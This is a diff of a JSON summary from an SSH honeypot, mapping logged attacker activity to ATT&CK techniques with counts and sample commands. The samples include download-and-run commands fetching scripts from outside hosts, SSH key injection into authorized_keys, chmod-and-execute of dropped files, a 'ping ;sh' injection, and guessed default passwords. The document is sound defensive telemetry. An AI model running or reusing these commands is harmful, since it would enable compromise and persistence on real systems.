@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-14 03:04:11",
+  "generated": "2026-09-14 04:03:44",
   "totals": {
-    "commands": 73,
-    "login_failed": 448,
-    "login_success": 27,
-    "sessions": 531
+    "commands": 137,
+    "login_failed": 1386,
+    "login_success": 40,
+    "sessions": 1499
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 448,
+      "count": 1386,
       "examples": [
         "root / ASDF321#@!",
         "root / admin",
@@ -21,14 +21,14 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:02:07.251693Z",
-      "last": "2026-09-14T03:04:10.588896Z",
-      "unique_ips": 17
+      "last": "2026-09-14T04:03:13.771870Z",
+      "unique_ips": 23
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 27,
+      "count": 40,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -37,49 +37,65 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:05:42.284899Z",
-      "last": "2026-09-14T02:51:45.662065Z",
-      "unique_ips": 12
+      "last": "2026-09-14T03:49:17.557754Z",
+      "unique_ips": 17
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 17,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
+      ],
+      "first": "2026-09-14T00:24:15.725892Z",
+      "last": "2026-09-14T03:39:23.431741Z",
+      "unique_ips": 2
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 4,
+      "count": 7,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s",
-        "https://del.sou.pp.ua/install_tm.sh"
+        "https://del.sou.pp.ua/install_tm.sh",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-14T00:24:16.661619Z",
-      "last": "2026-09-14T00:24:19.998418Z",
-      "unique_ips": 1
+      "last": "2026-09-14T03:39:23.431741Z",
+      "unique_ips": 2
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "uname -a",
         "uname -s -v -n -r -m"
       ],
       "first": "2026-09-14T00:24:20.002540Z",
-      "last": "2026-09-14T02:25:12.886325Z",
-      "unique_ips": 3
+      "last": "2026-09-14T03:06:28.364961Z",
+      "unique_ips": 4
     },
     {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 2,
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
       "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
-      "first": "2026-09-14T00:24:15.725892Z",
-      "last": "2026-09-14T00:24:20.002540Z",
+      "first": "2026-09-14T03:38:32.913918Z",
+      "last": "2026-09-14T03:38:32.913918Z",
       "unique_ips": 1
     },
     {
@@ -146,19 +162,23 @@
   "unmapped": [
     [
       "system",
-      16
+      25
     ],
     [
       "shell",
-      16
+      25
     ],
     [
       "sh",
-      16
+      25
     ],
     [
       "/bin/busybox UNSTABLE",
-      16
+      24
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
@@ -170,6 +190,26 @@
     ],
     [
       "rm -f /tmp/bendi.py",
+      1
+    ],
+    [
+      "enable",
+      1
+    ],
+    [
+      "linuxshell",
+      1
+    ],
+    [
+      "enablelinuxshell",
+      1
+    ],
+    [
+      "ping ;sh",
+      1
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       1
     ]
   ]
